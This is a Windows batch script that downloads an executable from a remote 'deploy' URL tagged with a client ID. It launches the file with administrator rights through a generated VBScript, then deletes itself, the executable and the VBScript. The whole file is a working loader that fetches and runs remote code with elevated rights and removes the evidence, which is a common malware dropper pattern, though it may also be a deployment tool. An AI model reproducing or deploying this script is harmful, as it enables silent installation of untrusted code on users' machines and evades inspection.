@echo off

set "url=https://api.yourpc.top/clients/f536b662-9935-40c3-a438-b02cb5b3b754/deploy/"
set "downloadedFile=yourFileName.exe"
set "tempFile=%temp%\%downloadedFile%"
set "vbsScript=%temp%\runAsAdmin.vbs"
set "scriptName=%~f0"

echo Downloading file from %url%
curl -o %tempFile% %url%

if %errorlevel% neq 0 (
    echo Error downloading file.
    exit /b 1
)

echo File downloaded successfully.

echo Creating VBScript to run as administrator
echo Set objShell = CreateObject("Shell.Application") > %vbsScript%
echo objShell.ShellExecute "%tempFile%", "", "", "runas", 1 >> %vbsScript%

echo Running VBScript
cscript //nologo %vbsScript%

echo Deleting script, file, and VBScript
del /f /q "%scriptName%"
del /f /q %tempFile%
del /f /q %vbsScript%
